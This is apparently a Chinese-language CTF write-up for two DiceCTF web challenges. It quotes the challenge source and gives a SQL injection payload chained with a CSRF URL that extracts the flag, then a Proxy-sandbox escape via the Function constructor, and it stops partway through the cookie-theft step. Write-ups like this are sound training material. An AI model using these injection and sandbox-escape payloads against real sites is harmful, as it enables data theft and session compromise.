> Cookie将在所有上下文中发送，即允许跨域发送。
>
> 以前 `None` 是默认值，但最近的浏览器版本将 `Lax` 作为默认值，以便对某些类型的跨站请求伪造
> （[CSRF](https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF)）
> 攻击具有相当强的防御能力。
>
> 使用 `None` 时，需在最新的浏览器版本中使用 [`Secure`](https://wiki.developer.mozilla.org/zh-> CN/docs/Web/HTTP/Headers/Set-Cookie) 属性。更多信息见下文。
这里我们可以看到本题 samesite 是设置了 lax ，意味着可能会有潜在的 CSRF 。
并且我们可以看到题目给我们的附件中， flag 是一开始就被插入到了数据库当中：
    query = `CREATE TABLE IF NOT EXISTS flag (
        flag TEXT
    )`;
    db.run(query, [], (err) => {
        if(!err){
            let innerQuery = `INSERT INTO flag SELECT 'dice{fake_flag}'`;
            db.run(innerQuery);
        }else{
            console.error('Could not create flag table');
        }
    });
所以我们可以尝试去看看是不是有什么注入点，接着审计我们就注意到：
    app.get('/admin/debug/add_widget', async (req, res) => {
        const cookies = req.cookies;
        const queryParams = req.query;
        if(cookies['token'] && cookies['token'] == secret_token){
            query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;
            db.run(query, (err) => {
                if(err){
                    console.log(err);
                    res.send('something went wrong');
                }else{
                    res.send('success!');
                }
            });
        }else{
            res.redirect('/');
        }
    });
虽然有 admin 才能操作的限制，但是这里也是比较明显的一个存在注入的地方，没什么过滤，我们可以直接闭合单引号就可以直接注了。flag
我们可以通过`(SELECT flag from flag)`子查询的方式获得，再看看我们应该怎么查看插入的数据，审计代码其中有一个查看的 API 是：
    app.post('/panel/widgets', (req, res) => {
        const cookies = req.cookies;
        if(cookies['panelId']){
            const panelId = cookies['panelId'];
            query = `SELECT widgetname, widgetdata FROM widgets WHERE panelid = ?`;
            db.all(query, [panelId], (err, rows) => {
                if(!err){
                    let panelWidgets = {};
                    for(let row of rows){
                        try{
                            panelWidgets[row['widgetname']] = JSON.parse(row['widgetdata']);
                        }catch{
                        }
                    }
                    res.json(panelWidgets);
                }else{
                    res.send('something went wrong');
                }
            });
        }
    });
这里没有 admin 的限制，通过这个路由我们可以通过 cookie 中的 panelId 来查询对应的 widgetdata
，并且有直接的回显，不过我们需要让查询得到的`row['widgetdata']`满足 JSON 的格式，这样才不会让`JSON.parse`函数出错。
所以我们大概又这么个思路，构造`panelid=foo',(SELECT+flag+from+flag),'{"type"%3a"sss"}>')%3b--&widgetname=1&widgetdata=1`，这样我们得到的
sqlite 语句就是
    INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('foo',(SELECT flag from flag),'{"type":"sss"}');--', '1', '1');
然后通过设置 cookie 为`panelId=foo`，通过`/panel/widgets`路由查询得到 flag
接下来需要做的就是怎么通过`/admin/debug/add_widget`路由的 admin 的前提条件，因为本题是个 XSS 题目，可以让 bot
访问我们的链接，并且在前面我们注意到 sameSite 设置为了 lax ，所以我们似乎可以通过让 admin 直接访问我们构造的如下的 url ，让
admin 帮我们插入这个数据，完成一次 CSRF 攻击。
    https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=foo',(SELECT+flag+from+flag),'{"type"%3a"sss"}')%3b--&widgetname=1&widgetdata=1
然后我们带着`panelId=foo`的 Cookie 访问`/panel/widgets`即可：
## Web IDE
###  Description
Work on JavaScript projects directly in your browser! Make something cool?
Send it [here](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=web-ide)
[web-ide.dicec.tf](https://web-ide.dicec.tf/)
题目附件：
    const express = require('express');
    const crypto = require('crypto');
    const app = express();
    const adminPassword = crypto.randomBytes(16).toString('hex');
    const bodyParser = require('body-parser');
    app.use(require('cookie-parser')());
    // don't let people iframe
    app.use('/', (req, res, next) => {
      res.setHeader('X-Frame-Options', 'DENY');
      return next();
    });
    // sandbox the sandbox
    app.use('/sandbox.html', (req, res, next) => {
      res.setHeader('Content-Security-Policy', 'frame-src \'none\'');
      // we have to allow this for obvious reasons
      res.removeHeader('X-Frame-Options');
      return next();
    });
    // serve static files
    app.use(express.static('public/root'));
    app.use('/login', express.static('public/login'));
    // handle login endpoint
    app.use('/ide/login', bodyParser.urlencoded({ extended: false }));
    app.post('/ide/login', (req, res) => {
      const { user, password } = req.body;
      switch (user) {
      case 'guest':
        return res.cookie('token', 'guest', {
          path: '/ide',
          sameSite: 'none',
          secure: true
        }).redirect('/ide/');
      case 'admin':
        if (password === adminPassword)
          return res.cookie('token', `dice{${process.env.FLAG}}`, {
            path: '/ide',
            sameSite: 'none',
            secure: true
          }).redirect('/ide/');
        break;
      }
      res.status(401).end();
    });
    // handle file saving
    app.use('/ide/save', bodyParser.raw({
      extended: false,
      limit: '32kb',
      type: 'application/javascript'
    }));
    const files = new Map();
    app.post('/ide/save', (req, res) => {
      // only admins can save files
      if (req.cookies.token !== `dice{${process.env.FLAG}}`)
        return res.status(401).end();
      const data = req.body;
      const id = `${crypto.randomBytes(8).toString('hex')}.js`;
      files.set(id, data);
      res.type('text/plain').send(id).end();
    });
    app.get('/ide/saves/:id', (req, res) => {
      // only admins can view files
      if (req.cookies.token !== `dice{${process.env.FLAG}}`)
        return res.status(401).end();
      const data = files.get(req.params.id);
      if (!data) return res.status(404).end();
      res.type('application/javascript').send(data).end();
    });
    // serve static files at ide, but auth first
    app.use('/ide', (req, res, next) => {
      switch (req.cookies.token) {
      case 'guest':
        return next();
      case `dice{${process.env.FLAG}}`:
        return next();
      default:
        return res.redirect('/login');
      }
    });
    app.use('/ide', express.static('public/ide'));
    app.listen(3000);
###  Solution
也还是一个 XSS 题，admin Cookie 就是 flag ，提供一些用户内容存储功能，但是由于只能保存为 js 文件，并且查看内容的 API
设置了`res.type('application/javascript').send(data).end();`，意味着无法直接执行 js 代码进行
XSS
再看到整体的功能，在 /ide/ 路由下存在一个页面可以执行一些 javascript 代码：
index.html
        Web IDE
          console.log('Hello World!');
          Run Code
          Save Code (Admin Only)
index.js
    (async () => {
      await new Promise((r) => { window.addEventListener(('load'), r); });
      document.getElementById('run').addEventListener('click', () => {
        document.querySelector('iframe')
          .contentWindow
          .postMessage(document.querySelector('textarea').value, '*');
      });
      document.getElementById('save').addEventListener('click', async () => {
        const response = await fetch('/ide/save', {
          method: 'POST',
          body: document.querySelector('textarea').value,
          headers: {
            'Content-Type': 'application/javascript'
          }
        });
        if (response.status === 200) {
          window.location = `/ide/saves/${await response.text()}`;
          return;
        }
        alert('You are not an admin.');
      });
    })();
我们可以看到该页面主要功能就是获取用户输入，将其使用`postMessage`函数发送给上级目录的 sandbox.html ，我们在看到
sandbox.html 页面内容主要由一个 sandbox.js 组成：
    (async () => {
      await new Promise((r) => { window.addEventListener(('load'), r); });
      const log = (data) => {
        const element = document.createElement('p');
        element.textContent = data.toString();
        document.querySelector('div').appendChild(element);
        window.scrollTo(0, document.body.scrollHeight);
      };
      const safeEval = (d) => (function (data) {
        with (new Proxy(window, {
          get: (t, p) => {
            if (p === 'console') return { log };
            if (p === 'eval') return window.eval;
            return undefined;
          }
        })) {
          eval(data);
        }
      }).call(Object.create(null), d);
      window.addEventListener('message', (event) => {
        const div = document.querySelector('div');
        if (div) document.body.removeChild(div);
        document.body.appendChild(document.createElement('div'));
        try {
          safeEval(event.data);
        } catch (e) {
          log(e);
        }
      });
    })();
主要内容就是获取`postMessage`得到的内容，并将其放入到`safeEval`函数中进行执行，其中使用了`Proxy`类创建了一个类似沙箱的功能，只能执行有限的
js 代码:
    with (new Proxy(window, {
      get: (t, p) => {
        if (p === 'console') return { log };
        if (p === 'eval') return window.eval;
        return undefined;
      }
    })) {
      eval(data);
    }
所以我们需要绕过这个限制，根据以往的绕过沙箱的老套路，我们可以尝试传入一个 window
对象，通过`"".constructor.constructor("return this")()`获取到 window 对象，我们可以直接在其中执行 js
代码，例如：
    "".constructor.constructor("console.log(window.location)")()
因为 sandbox.html 在接受 message 没有验证 origin
，所以我们可以自己本地弄一个页面`postMessage`验证是否是成功在他的域名上执行了 js 代码：
所以根据下图的实验结果显示，我们是可以绕过了其 sandbox 成功执行了 js 代码
接下来我们就需要看看怎么获取 flag 了，在题目附件中我们看到：
    return res.cookie('token', `dice{${process.env.FLAG}}`, {
      path: '/ide',
      sameSite: 'none',
      secure: true
    }).redirect('/ide/');
这里光绕过 sandbox 执行 js 还不够，还需要在 /ide 路径下执行，否则在 sanbox 执行的 js 不能直接获取到 /ide 路径下的
cookie ，接下来我想到的非预期就是通过 sandbox 使用`window.open`打开一个 /ide 页面，然后再获取其 cookie
，大致代码如下：
    var opener = window.open("https://web-ide.dicec.tf/sandbox.html");